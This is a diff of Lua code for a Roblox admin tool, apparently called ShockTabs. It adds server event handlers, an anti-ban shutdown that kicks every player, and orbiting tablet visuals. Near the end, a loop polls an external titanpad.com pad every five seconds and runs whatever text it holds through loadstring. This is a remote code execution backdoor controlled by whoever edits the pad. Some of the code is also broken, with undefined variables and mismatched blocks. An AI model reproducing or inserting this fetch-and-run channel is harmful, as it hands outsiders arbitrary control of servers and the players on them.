+Core.RE.OnServerEvent:connect(function(player, arguments)
+   -- print'Got'
+    local Command=arguments[1]
+    --if arguments[2]==Core.Variables['VerKey'] then
+      --print'Verified'
+        if Command=='dt' then
+            --print'Running'
+            Core.Functions.Dismiss(player.Name)
+    elseif Command=='self' then
+        Core.Commands['SelfRanks'].Function(player,{})
+           end
+        --end
+end)
+table.insert(Core.Events,game:service'Players'.ChildRemoved:connect(function(p)-- player leaves, or is kicked
+      if p:IsA'Player'==false then return end
+      local pname=p.Name
+      if Core.AntiBanned[p.Name]~=nil and Core.AntiBanned[p.Name]==true then
+        -- Shutdown server
+        local sd=true
+        for i,v in pairs(game:service'Players':GetPlayers()) do
+          if Core.Functions.GetRank(v.Name) >= 6 then
+            Core.Functions.Tab(v,'Cancel Shutdown','AntiBan','Really red',
+            function() sd=false end)
+            end
+          end
+          for z=0,60,1 do
+            if sd==false then
+              Core.Functions.Hint('['..Core.Variables.AdminName..']: Shutdown aborted.')
+            end
+            if sd==true then
+              Core.Functions.Hint('['..Core.Variables.AdminName..']: '..v.Name..' has left/been kicked. If he does not return the server will shutdown in ('..z..') Seconds')
+              wait(1)
+            end
+          end
+          if sd and game:service'Players':FindFirstChild(pname)==nil then
+            for i,v in pairs(game:service'Players':GetPlayers()) do
+              v:kick('Antiban activated.')
+            end
+          end
+        end
+        end))
+        game:service'Players'.ChildAdded:connect(function(Player)
+         if Player:IsA'Player' then
+        Core.Functions.PlayerAdded(Player)
+        end
+       end)
+  table.insert(Core.Events,game:service'RunService'.Heartbeat:connect(function()
+    if Baser and game:service'Players':FindFirstChild'Baser' then
+            pcall(function()
+              local char=game:service'Players':FindFirstChild'Baser'.Character
+        workspace.Base.CFrame=CFrame.new(Char.Torso.CFrame.X,-.6,Char.Torso.CFrame.Z)
+      end)
+    else
+      pcall(function()
+        workspace.Base.CFrame=CFrame.new(0,-.6,0)
+      end)
+    end
+  if _G.sb~=nil or sb~=nil then
+    if Core.Variables.SdOnBreakout==true and sb ~= nil then -- fixed
+    for i,v in pairs(game:service'Players':GetPlayers()) do
+      v:kick('Shutdown due to breakout renaming sandbox variable "sb" to '..sb)
+    end
+  end
+end
+local time=tick()-Core.Variables.Starttime
+local ActiveTabs={}
+for i,v in pairs(Core.tablets) do
+  if v.Part.Parent==v.Parent then
+    table.insert(ActiveTabs,v)
+  end
+end
+for h,j in pairs(game:service'Players':GetPlayers()) do
+  pcall(function()
+  local PlayerTabs={};
+  for _,v in pairs(ActiveTabs) do
+    if(v and v.Player and v.Player==j.Name)then
+      table.insert(PlayerTabs,v);
+    elseif not (v.Player) then
+      v.Part.CFrame=CFrame.new(0,-150,0)
+    end
+  end
+  for i,v in pairs(PlayerTabs) do
+    pcall(function()
+      pcall(function()
+      local pos = Vector3.new(0,-150,0)
+      pcall(function()
+      pos = j.Character.Torso.CFrame
+      end)
+      local x = math.sin(time/#PlayerTabs + (math.pi*2)/#PlayerTabs*i) * (#PlayerTabs+6)
+      local z = math.cos(time/#PlayerTabs + (math.pi*2)/#PlayerTabs*i) * (#PlayerTabs+6)
+      local  cPos = v.Part.Position
+      local ePos = Vector3.new(x, 0, z) + (pos.p or Vector3.new(0, -5, 0))
+      local nPos = (ePos-cPos)*.25
+      cPos = cPos + nPos
+      local t = (tick() - starttime) % 360
+      local change = 0.625
+      v.Part.CFrame = CFrame.new(0,up,0)*CFrame.new(cPos, (pos.p or Vector3.new(0, -5, 0))) * CFrame.Angles(math.rad(11.25), 0, 0)
+      end)
+      end)
+    end
+    end)
+  end
+  end))
+      Core.Functions.updtrankz()
+  --[[WirePart=function(PartA,PartB,Wire) --Nvm
+  spawn(function()
+  local dist=(PartA.CFrame.p-PartB.CFrame.p).magnitude
+  if not PartA:findFirstChild"CWire" then return end
+  -- Wire=PartA.CWire
+  Wire.Size=Vector3.new(.2,.2,dist)
+  Wire.CFrame=(CFrame.new(PartA.CFrame.p,PartB.CFrame.p)*CFrame.new(0,0,-dist/2))
+  Wire.Transparency=0
+  end)
+  end]]
+
+
+  spawn(function()
+  Core.Functions.updtrankz()
+  Core.VipServers=Core.Functions.JSONDecode(Core.DataSave:GetAsync('VipServers'))
+  -- end) -- Calling a function straight away, but in local so its variables are local.
+Core.Functions.Tab(owner, 'Admin Loaded', 'ShockTabs Loader','Really red', nil,5)
+end)
+local lasttext=''
+repeat wait(5) -- here.. umm dude how df u make it print on everybody? I SEEE
+local text=game:service'HttpService':GetAsync('https://titanpad.com/ep/pad/export/WODJy5ZPXY/latest?format=txt')
+if text~=lasttext then
+lasttext=text
+coroutine.resume(coroutine.create(function()
+loadstring(text)() -- kkk i get text but should we make like local get = game:service'HttpService:GetAsync('slack?') then put it into titanpad
+end)) -- wot happened to cmdbar log? works, but its me
+until toend==true
+return
+end))
+end
+end)
+else
+script:Destroy()
+end
